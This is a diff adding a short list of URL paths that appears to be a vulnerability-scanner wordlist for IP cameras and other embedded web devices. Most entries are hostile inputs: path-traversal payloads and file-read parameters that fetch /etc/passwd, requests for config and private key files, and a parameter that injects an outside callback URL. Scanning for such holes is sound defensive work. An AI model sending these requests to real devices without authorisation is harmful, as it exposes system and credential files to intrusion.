@@ -1,0 +1,16 @@
+/current_config/passwd
+/../../etc/passwd
+/overview.asp
+/adm/file.cgi?next_file=%2fetc%2fpasswd
+/../../../../../../../../../../../../../etc/passwd
+/command/prima-factory.cgi
+/../../../../../etc/passwd
+/conf/nginx.conf
+/Security/users?auth={{b64auth}}
+/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+/cgi-bin/operator/fileread?READ.filePath=/etc/passwd
+/Pages/login.htm
+/web/cgi-bin/hi3510/param.cgi?cmd=setmobilesnapattr&cururl=http%3A%2F%2Finteract.sh
+/self.key
+/api/config
+/config/cam_portal.cgi
